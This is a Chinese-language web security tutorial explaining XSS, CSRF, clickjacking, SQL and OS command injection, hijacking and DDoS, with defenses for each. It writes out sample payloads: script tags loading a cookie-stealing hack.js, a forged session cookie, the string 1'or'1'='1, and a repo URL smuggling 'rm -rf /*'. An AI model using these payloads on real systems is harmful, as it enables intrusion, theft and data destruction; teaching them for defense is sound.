# 引言
***
此篇文章主要涉及以下内容：
1. `XSS`
2. `CSRF`
3. 点击劫持
4. `SQL`注入
5. `OS`注入
6. 请求劫持
7. `DDOS`
# XSS
***
**XSS（Cross Site Scripting）**，跨站脚本攻击，因为缩写和`CSS`重叠，所以只能叫`XSS`。跨站脚本攻击是指通过存在安全漏洞的`Web`网站注册用户的浏览器内运行非法的`HTML`标签或`JavaScript`进行的一种攻击。
跨站脚本攻击有可能造成以下影响：
- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的`Cookie`值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。
##XSS攻击分类
- 反射性——url参数直接注入
```
// 普通
http://localhost:3000/?from=china
// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>
// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
</script>
// 短域名伪造 https://dwz.cn/
// 伪造cookie⼊侵 chrome
document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjox
NTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```
- 存储型——存储到`DB`后读取时注入
```
// 评论
<script>alert(1)</script>
// 跨站脚本注⼊
我来了<script src="http://localhost:4000/hack.js"></script>
```
##XSS攻击的危害——scripting能干啥就能干啥
- 获取页面数据
- 获取cookies
- 劫持前端逻辑
- 发送请求
- 偷取网站的任意数据
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户
## 防范手段
>ejs转义小知识
```
<% code %>⽤于执⾏其中javascript代码；
<%= code %>会对code进⾏html转义；
<%- code %>将不会进⾏转义
```
- HEAD
```
ctx.set('X-XSS-Protection', 0) // 禁⽌XSS过滤
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装⼀下就
不⾏了
```
>0禁止XSS过滤。
>1启用XSS过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
>1;mode=block启用XSS过滤。如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
>1;report=(Chromium only)启动XSS过滤。如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP[report-uri](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri)指令的功能发送违规报告。

- CSP
**内容安全策略**（CSP，Content Security Policy）是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。
CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少XSS攻击。
- 转义字符
- 黑名单
用户的输入永远不可信任，最普遍的做法就是转义输入输出的内容，对于引导、尖括号、斜杠进行转义。
对于富文本，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。
- HTTPOnly Cookie
这是预防XSS攻击窃取用户cookie最有效的防御手段。web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript获取，保护用户cookie信息。
```
response.addHeader("Set-Cookie","uid=112;Path=/;HttpOnly")
```
#CSRF
***
**CSRF**（Cross Site Request Forgery），即跨站请求伪造，是一种常见的web攻击，他利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。
- 用户已经登录了站点A，并在本地记录了Cookie
- 在用户没有登出站点A的情况下（也就是cookie生效的情况下），访问了恶意攻击者提供的引诱危险站点B（B站点要求访问站点A）
- 站点A没有做任何CSRF防御
```
登录 http://localhost:4000/csrf.html
```
##CSRF攻击危害
- 利用用户登录态
- 用户不知情
- 完成业务请求
- 盗取用户资金（转账，消费）
- 冒充用户发帖背锅
- 损害网站声誉
##防御
- 禁止第三方网站带Cookie——有兼容性问题
- Referer Check——https不发送Referer
- 验证码
#点击劫持——Clickjacking
点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过iframe嵌套的方式嵌入自己的网页中，并将iframe设置为透明，在页面中透出一个按钮诱导用户点击。
```
// 登录
http://localhost:4000/clickjacking.html
```
##防御
- X-FRAME-OPTIONS
`X-FRAME-OPTIONS`是一个HTTP响应头，在现代浏览器有一个很好的支持。这个HTTP响应头就是为了防御用iframe嵌套的点击劫持攻击。
该响应头有三个值可选，分别是：
  1. DENY，表示页面不允许通过iframe的方式展示
  2. SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示
  3. ALLOW-FROM，表示页面可以在指定来源的iframe中展示
  ```
  ctx.set('X-FRAME-OPTIONS','DENY')
  ```
- JS方式
```
<head>
 <style id="click-jack">
 html {
 display: none !important;
 }
 </style>
</head>
<body>
 <script>
 if (self == top) {
 var style = document.getElementById('click-jack')
 document.body.removeChild(style)
 } else {
 top.location = self.location
 }
 </script>
</body>
```
以上代码的作⽤就是当通过 iframe 的⽅式加载⻚⾯时，攻击者的⽹⻚直接不显示所有内容了。
## SQL注入
```
// 填⼊特殊密码
1'or'1'='1
// 拼接后的SQL
SELECT *
FROM test.user
WHERE username = 'laowang'
AND password = '1'or'1'='1'
```
## 防御
- 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如Node.js中的mysqljs库的query方法中的？占位参数。
- 严格限制web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。
- 后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。
- 对进⼊数据库的特殊字符（'，"，\，<，>，&，*，; 等）进⾏转义处理，或编码转换。基本上
所有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar
库。
## OS命令注入
OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。
```
// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo
const exec = require('mz/child_process').exec;
let params = {/* ⽤户输⼊的参数 */};
exec(`git clone ${params.repo} /some/path`);
```
如果传⼊的参数是这样的呢
```
https://github.com/xx/xx.git && rm -rf /* &&
```
## 请求劫持
- DNS劫持
顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期
的ip
- HTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了
## DDOS
>http://www.ruanyifeng.com/blog/2018/06/ddos.html 阮⼀峰

distributed denial of service
DDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。⽹站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的⽬的。
其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个地址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼就是⼀大堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个⼈⽹站没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。
![ ](https://upload-images.jianshu.io/upload_images/15424855-6931f3c52ab995cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image.png](https://upload-images.jianshu.io/upload_images/15424855-23b990e65b1fc8d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image.png](https://upload-images.jianshu.io/upload_images/15424855-51330c832f92a946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 防御手段
- 备份⽹站
 备份⽹站不⼀定是全功能的，如果能做到全静态浏览，就能满⾜需求。最低限度应该可以显示公
告，告诉⽤户，⽹站出了问题，正在全⼒抢修。
- HTTP 请求的拦截
 硬件 服务器 防⽕墙
- 带宽扩容 + CDN
 提⾼犯罪成本